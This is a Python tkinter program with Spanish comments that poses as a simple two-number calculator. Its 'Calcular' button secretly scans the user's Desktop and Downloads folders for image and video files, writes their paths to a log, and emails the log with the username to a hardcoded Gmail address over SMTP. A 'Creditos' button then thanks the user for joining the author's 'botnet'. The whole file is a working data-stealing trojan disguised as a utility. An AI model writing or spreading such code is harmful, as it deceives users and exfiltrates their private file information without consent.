from tkinter import *

#creacion de la ventana
app = Tk()
#le doy una resolucion a la aplicacion
app.geometry("400x400")
#le doy un titulo
app.title("Solo soy una pequeña suma...")

#creo una funcion para enviar correos
def sumar():
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
    from os import walk
    import os,getpass, smtplib, platform,base64
    contenido = []
    #sistema = platform.system()
    #proc = platform.processor()
    usuario = getpass.getuser()
    log = open("log.txt", "w")
    ruta = ["C://Users//"+usuario+"//Desktop//","C://Users//"+usuario+"//Downloads//"]
    for r in ruta:
        for root, dirs, files in walk(r):
            for archivo in files:
                (nombreArchivo, extension) = os.path.splitext(archivo)
                if extension == ".jpg" or extension == ".png" or extension == ".mp4":
                    log.write(root)
                    log.write(archivo)
                    log.write("\n")
    remitente = 'correo@gmail.com'
    destinatario = 'correo@gmail.com'
    asunto = "Usuario: "+usuario
    cuerpo = usuario#": Sistema : "+sistema+": Procesador : "+proc
    ruta_adjunto = "log.txt"
    nombre_adjunto = "log.txt"
    mensaje = MIMEMultipart()
    mensaje['From'] = remitente
    mensaje['To'] = destinatario
    mensaje['Subject'] = asunto
    mensaje.attach(MIMEText(cuerpo, 'plain'))
    archivo_adjunto = open(ruta_adjunto, 'rb')
    adjunto_MIME = MIMEBase('application','octet-stream')
    adjunto_MIME.set_payload((archivo_adjunto).read())
    encoders.encode_base64(adjunto_MIME)
    adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_adjunto)
    mensaje.attach(adjunto_MIME)
    sesion_smtp = smtplib.SMTP('smtp.gmail.com', 587)
    sesion_smtp.starttls()
    sesion_smtp.login('su correo de gmail','su contraseña')
    texto = mensaje.as_string()
    sesion_smtp.sendmail(remitente, destinatario, texto)
    sesion_smtp.quit()
    enviado = Label(app, text=":.OK.:")
    enviado.place(x = 220, y = 180)
                
    n1 = int(numero1_.get())
    n2 = int(numero2_.get())
    suma = n1 + n2
    resta = n1 - n2
    salida_datos = Label(app, text=suma)
    salida_datos.place(x = 140, y = 180)
    salida_resta = Label(app, text=resta)
    salida_resta.place(x = 200, y = 180)

#creo la funcion salir, la cual muestra algunos datos
def salir():
    import platform, getpass, os
    username = getpass.getuser()
    os = platform.system()
    proc = platform.processor()
    arch = platform.architecture()
    cooperar = Label(app, text="Gracias por ser parte de mi botnet.. \n Soy un poco nuevo en esta parte... \n Usuario: "+username+" \n Su procesador es: "+proc+ "\n Su sistema operativo: "+os)
    cooperar.place(x = 10, y = 300)


#creo las etiquetas
datos_ = Label(app, text=":...Calcular dos numeros...:")
numero1 = Label(app, text="Ingrese un numero: ")
numero2 = Label(app, text="Ingrese un numero: ")
creditos = Label(app, text=":____________creado por CR4$H____________:")

#creo entrada de texto
numero1_ = Entry(app)
numero2_ = Entry(app)

#creo botones
boton_sumar = Button(app,text="Calcular", command=sumar)
boton_salir = Button(app,text="Creditos", command=salir)


#creo la rejilla para ubicar los elementos dentro de la ventana
#se usa columns y row (columnas y filas)
numero1.place(x = 40, y = 50)
numero2.place(x = 40, y = 80)
numero1_.place(x = 150, y = 50)
numero2_.place(x = 150, y = 80)
datos_.place(x = 105, y = 20)
boton_sumar.place(x = 70, y = 120)
boton_salir.place(x = 210, y = 120)
creditos.place(x = 80, y = 380)

#ejecucion de la aplicacion
app.mainloop()
